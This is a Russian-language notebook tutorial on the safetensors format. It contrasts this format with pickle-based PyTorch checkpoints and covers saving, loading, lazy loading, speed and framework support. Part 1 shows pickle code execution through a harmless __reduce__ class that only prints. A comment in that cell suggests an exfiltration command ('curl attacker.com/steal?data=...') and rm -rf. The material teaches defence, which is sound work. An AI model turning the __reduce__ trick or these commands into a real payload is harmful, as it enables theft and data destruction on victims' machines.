# Safetensors — безопасное хранение весов моделей

**Репозиторий проекта:** https://github.com/huggingface/safetensors

**Демо подготовила:** Амелия Алаева

**Полезные ссылки:**
- [GitHub репозиторий safetensors](https://github.com/huggingface/safetensors)
- [Документация](https://huggingface.co/docs/safetensors)
- [Сравнение скоростей](https://huggingface.co/docs/safetensors/speed)


---

## Что такое safetensors и зачем он нужен?

Когда мы обучаем модель, нам нужно сохранить её веса на диск и потом загрузить их обратно. В PyTorch для этого традиционно используется `torch.save` / `torch.load` — а под капотом там **pickle**.

### Проблема: **pickle небезопасен**

**Pickle** — это питоновский механизм сериализации объектов.

Это очень гибкий инструмент, он может сохранить почти что угодно. Но именно поэтому он **опасен**: при десериализации pickle может выполнить произвольный Python-код. Злоумышленник может подсунуть вам файл `.pt` или `.bin`, который при загрузке:
- удалит файлы с диска
- отправит ваши данные на сторонний сервер
- установит вредоносное ПО
- сделает что угодно другое


В эпоху, когда модели массово скачиваются с Hugging Face Hub и других источников — это реальная угроза.


**Немного теории**

> *Что такое сериализация?*
>
> *Сериализация* — это превращение объекта из памяти в поток байт, который можно записать на диск или передать по сети.
>
> *Десериализация* — обратный процесс: из байт восстанавливаем объект в памяти.
>
> Проблема в том, что объект в памяти — это сложная структура: у него есть тип, атрибуты, ссылки на другие объекты, методы. Нужно договориться, как всё это закодировать и потом восстановить.


**Как устроен pickle:**

Pickle — это маленькая стековая виртуальная машина. Файл `.pkl / .pt` — это не просто данные, это **программа на специальном байткоде**, которую Python исполняет при загрузке. У этой программы есть:
- стек — рабочая область
- memo — словарь для хранения уже созданных объектов (для обработки циклических ссылок)
- набор опкодов — инструкции


**Пример: как сериализуется простой словарь**

```
import pickle, pickletools
data = {"x": 42}
pickletools.dis(pickle.dumps(data))
```

Вывод будет примерно такой:
```
    0: \x80 PROTO      4          # версия протокола
    2: \x95 FRAME      11
   11: }    EMPTY_DICT             # положить пустой dict на стек
   12: \x94 MEMOIZE                # запомнить в memo
   13: (    MARK                   # маркер начала пары ключ-значение
   14: \x8c SHORT_BINUNICODE 'x'   # строка "x"
   17: K    BININT1    42          # число 42
   19: u    SETITEMS               # dict.update(items со стека)
   20: .    STOP                   # конец — вернуть верхушку стека
```

Это буквально программа: «создай пустой dict, положи ключ, положи значение, вставь, верни».

**Ключевой опкод: REDUCE и GLOBAL**

Вот где начинается опасность. Pickle содержит опкоды:

- **`GLOBAL`** — загрузить любой объект по имени модуля и функции: `pickle.loads` видит `"os" "system"` → делает `import os; f = os.system`
- **`REDUCE`** — вызвать функцию с аргументами: берёт функцию и кортеж аргументов со стека, вызывает `f(*args)`

Вместе они разрешают: **«вызови любую Python-функцию с любыми аргументами»**.




### Решение: **safetensors**

Библиотека **safetensors** от Hugging Face предлагает новый формат файла `.safetensors`, который:

| Свойство | pickle / `.pt` | safetensors |
|---|---|---|
| **Безопасность** | выполняет код при загрузке | только данные, никакого кода |
| **Скорость загрузки** | медленнее | быстрее (zero-copy на CPU) |
| **Lazy loading** | грузит всё сразу | можно загрузить только нужные слои |
| **Мультифреймворк** | только PyTorch | PyTorch, NumPy, JAX, TF, MLX |
| **Инспекция без загрузки** | нельзя | можно прочитать метаданные |

### Как устроен формат

Файл `.safetensors` имеет простую структуру:
1. **8 байт** — размер заголовка (uint64, little-endian)
2. **N байт** — JSON-заголовок с метаданными: имена тензоров, dtype, shape, смещения в файле
3. **Данные тензоров** — сырые байты

**JSON-заголовок выглядит так:**

```
{
  "weight": {"dtype": "F32", "shape": [256, 128], "data_offsets": [0, 131072]},
  "bias":   {"dtype": "F32", "shape": [256],      "data_offsets": [131072, 133120]}
}
```

Именно потому что формат содержит только сырые числа + JSON-метаданные, загрузчик физически **не может** выполнить произвольный код — там просто нет такого механизма.

### Кто использует safetensors?

Сегодня формат поддерживается в: `transformers`, `diffusers`, `stable-diffusion-webui`, `ComfyUI`, `llama.cpp`, `ColossalAI`, Apple MLX и десятках других проектов.

## Часть 0. Установка

In [1]:
!pip install safetensors torch -q

## Часть 1. Демонстрация уязвимости pickle

Покажем, что файл `.pt`, скачанный из интернета, может выполнить произвольный код при загрузке — даже если вы этого не ожидаете.

In [2]:
import pickle
import io
import torch

# Создаём вредоносный класс — его __reduce__ вызывается при десериализации pickle
class HackerPayload:
    def __reduce__(self):
        import os
        # В реальной атаке здесь мог быть: os.system('curl attacker.com/steal?data=...'), rm -rf, etc
        return (print, ("ВНИМАНИЕ: этот код выполнился при загрузке модели!\n"
                        "В реальной атаке здесь мог быть вирус или кража данных.",))

# Создаём словарь весов, где одно из 'значений' — вредоносный объект
malicious_weights = {
    "layer.weight": torch.zeros(3, 3),
    "__exploit__": HackerPayload()  # вот он
}

# Сохраняем через torch.save (внутри — pickle)
torch.save(malicious_weights, "malicious_model.pt")
print("Файл malicious_model.pt сохранён.")
print("Теперь загружаем его.\n")

# Загружаем, и вредоносный код выполняется
loaded = torch.load("malicious_model.pt", weights_only=False)
print("\nЗагрузка завершена.")

Файл malicious_model.pt сохранён.
Теперь загружаем его.

ВНИМАНИЕ: этот код выполнился при загрузке модели!
В реальной атаке здесь мог быть вирус или кража данных.

Загрузка завершена.


 **Что произошло:** при вызове `torch.load` pickle автоматически вызвал `__reduce__` у нашего объекта — и код выполнился. Мы не просили его запускать; нам казалось, что мы просто грузим веса.

 Были зафиксированы случаи, когда `.pt`-файлы на публичных хабах содержали вредоносный код. Именно поэтому PyTorch начал добавлять `weights_only=True`, но это ограничение обходится.

## Часть 2. Сохранение и загрузка через safetensors

Посмотрим, как выглядит работа с safetensors — это просто, быстро и безопасно.

In [3]:
import torch
from safetensors.torch import save_file, load_file

# Набор весов маленькой модели
model_weights = {
    "embedding.weight":    torch.randn(1000, 128),
    "encoder.fc1.weight":  torch.randn(256, 128),
    "encoder.fc1.bias":    torch.randn(256),
    "encoder.fc2.weight":  torch.randn(64, 256),
    "encoder.fc2.bias":    torch.randn(64),
    "head.weight":         torch.randn(10, 64),
    "head.bias":           torch.randn(10),
}

print("Веса модели:")
for name, tensor in model_weights.items():
    print(f"  {name:30s}  shape={str(tensor.shape):20s}  dtype={tensor.dtype}")

Веса модели:
  embedding.weight                shape=torch.Size([1000, 128])  dtype=torch.float32
  encoder.fc1.weight              shape=torch.Size([256, 128])  dtype=torch.float32
  encoder.fc1.bias                shape=torch.Size([256])     dtype=torch.float32
  encoder.fc2.weight              shape=torch.Size([64, 256])  dtype=torch.float32
  encoder.fc2.bias                shape=torch.Size([64])      dtype=torch.float32
  head.weight                     shape=torch.Size([10, 64])  dtype=torch.float32
  head.bias                       shape=torch.Size([10])      dtype=torch.float32


In [4]:
# Сохраняем в safetensors
save_file(model_weights, "model.safetensors")
print("Сохранено в model.safetensors")

# Для сравнения сохраним те же веса через pickle
torch.save(model_weights, "model_pickle.pt")
print("Сохранено в model_pickle.pt")

Сохранено в model.safetensors
Сохранено в model_pickle.pt


In [5]:
import os

# Сравним размеры файлов
st_size = os.path.getsize("model.safetensors")
pt_size = os.path.getsize("model_pickle.pt")

print(f"Размер model.safetensors : {st_size:,} байт")
print(f"Размер model_pickle.pt   : {pt_size:,} байт")
print(f"\nSafetensors {'меньше' if st_size < pt_size else 'немного больше'} — pickle хранит служебные метаданные Python-объектов.")

Размер model.safetensors : 713,056 байт
Размер model_pickle.pt   : 715,730 байт

Safetensors меньше — pickle хранит служебные метаданные Python-объектов.


In [6]:
# Загружаем веса обратно
loaded_weights = load_file("model.safetensors")

print("Загружено из model.safetensors")
print("\nПроверяем, что веса совпадают:")
for key in model_weights:
    match = torch.allclose(model_weights[key], loaded_weights[key])
    print(f"  {key:30s}  {'ok' if match else 'Ошибка!!'}")

Загружено из model.safetensors

Проверяем, что веса совпадают:
  embedding.weight                ok
  encoder.fc1.weight              ok
  encoder.fc1.bias                ok
  encoder.fc2.weight              ok
  encoder.fc2.bias                ok
  head.weight                     ok
  head.bias                       ok


## Часть 3. Инспекция файла без загрузки тензоров

Один из полезных бонусов safetensors — можно быстро посмотреть, что внутри файла, **не загружая сами веса в память**. С pickle это невозможно без выполнения кода.

In [7]:
from safetensors import safe_open

# Открываем файл и читаем только метаданные — тензоры не загружаются
with safe_open("model.safetensors", framework="pt", device="cpu") as f:
    print("Содержимое model.safetensors:")
    print(f"{'Имя тензора':30s}  {'Shape':20s}  {'dtype'}")
    print("-" * 65)
    for key in f.keys():
        meta = f.get_slice(key)
        shape = meta.get_shape()
        # Читаем dtype через маленький срез
        t = f.get_tensor(key)
        print(f"  {key:28s}  {str(shape):20s}  {t.dtype}")

print("\nМы прочитали метаданные — никакого кода не выполнялось.")

Содержимое model.safetensors:
Имя тензора                     Shape                 dtype
-----------------------------------------------------------------
  embedding.weight              [1000, 128]           torch.float32
  encoder.fc1.bias              [256]                 torch.float32
  encoder.fc1.weight            [256, 128]            torch.float32
  encoder.fc2.bias              [64]                  torch.float32
  encoder.fc2.weight            [64, 256]             torch.float32
  head.bias                     [10]                  torch.float32
  head.weight                   [10, 64]              torch.float32

Мы прочитали метаданные — никакого кода не выполнялось.


## Часть 4. Lazy loading — загружаем только нужные слои

Это особенно важно при работе с большими моделями на нескольких GPU: каждый процесс загружает только свои слои.

In [8]:
from safetensors import safe_open

# Допустим, нам нужны только веса головы (head.*) — например, для fine-tuning последнего слоя
print("Загружаем только слои head.*:")

head_weights = {}
with safe_open("model.safetensors", framework="pt", device="cpu") as f:
    for key in f.keys():
        if key.startswith("head"):
            head_weights[key] = f.get_tensor(key)
            print(f"  Загружен: {key}  shape={head_weights[key].shape}")

print(f"\nЗагружено {len(head_weights)} из {len(model_weights)} тензоров.")
print("Остальные 5 тензоров НЕ попали в память - экономим RAM.")

Загружаем только слои head.*:
  Загружен: head.bias  shape=torch.Size([10])
  Загружен: head.weight  shape=torch.Size([10, 64])

Загружено 2 из 7 тензоров.
Остальные 5 тензоров НЕ попали в память - экономим RAM.


## Часть 5. Сравнение скорости загрузки

Safetensors использует zero-copy на CPU: данные напрямую маппируются из файловой системы в память без лишних аллокаций.

In [10]:
import time
import torch
from safetensors.torch import save_file, load_file

# Создадим файл побольше — ~200 МБ весов
big_weights = {
    f"layer_{i}.weight": torch.randn(1024, 1024) for i in range(50)
}

save_file(big_weights, "big_model.safetensors")
torch.save(big_weights, "big_model_pickle.pt")

print(f"Файл safetensors: {os.path.getsize('big_model.safetensors') / 1e6:.1f} МБ")
print(f"Файл pickle:      {os.path.getsize('big_model_pickle.pt') / 1e6:.1f} МБ")
print()

N = 5

# Замеряем safetensors
start = time.perf_counter()
for _ in range(N):
    _ = load_file("big_model.safetensors", device="cpu")
st_time = (time.perf_counter() - start) / N

# Замеряем pickle
start = time.perf_counter()
for _ in range(N):
    _ = torch.load("big_model_pickle.pt", weights_only=True)
pt_time = (time.perf_counter() - start) / N

print(f"Среднее время загрузки (N={N}):")
print(f"  safetensors : {st_time:.3f} сек")
print(f"  pickle      : {pt_time:.3f} сек")
speedup = pt_time / st_time
print(f"\nsafetensors быстрее в {speedup:.1f}x")

Файл safetensors: 209.7 МБ
Файл pickle:      209.7 МБ

Среднее время загрузки (N=5):
  safetensors : 0.005 сек
  pickle      : 0.105 сек

safetensors быстрее в 22.9x


## Часть 6. Поддержка нескольких фреймворков

Формат `.safetensors` универсален: один и тот же файл можно загрузить в PyTorch, NumPy, JAX, TensorFlow и Apple MLX.

In [11]:
import numpy as np
from safetensors.numpy import save_file as np_save_file
from safetensors import safe_open

# Сохраняем numpy-массивы
np_weights = {
    "weights": np.random.randn(64, 128).astype(np.float32),
    "bias":    np.random.randn(64).astype(np.float32),
}
np_save_file(np_weights, "numpy_model.safetensors")

# Загружаем тот же файл как PyTorch-тензоры
with safe_open("numpy_model.safetensors", framework="pt", device="cpu") as f:
    pt_weights = {k: f.get_tensor(k) for k in f.keys()}

print("Сохранили как NumPy, загрузили как PyTorch:")
for key in pt_weights:
    t = pt_weights[key]
    print(f"  {key}: type={type(t).__name__}, shape={t.shape}, dtype={t.dtype}")

Сохранили как NumPy, загрузили как PyTorch:
  bias: type=Tensor, shape=torch.Size([64]), dtype=torch.float32
  weights: type=Tensor, shape=torch.Size([64, 128]), dtype=torch.float32


## **Итог**

**Safetensors:**
- Безопасный
- Быстрый
- Lazy loading
- Инспекция метаданных
- Поддержка различных фреймворков
- Прост в использовании

**Вывод:** safetensors — это хорошая замена для `torch.save/load`, которая одновременно безопаснее, быстрее и удобнее. Если вы публикуете модели или скачиваете чужие — используйте этот формат.

```python
# Brain:
torch.save(model.state_dict(), 'model.pt')
model.load_state_dict(torch.load('model.pt'))

# ULTRA DUPER BIG BRAIN:
from safetensors.torch import save_file, load_file
save_file(model.state_dict(), 'model.safetensors')
model.load_state_dict(load_file('model.safetensors'))
```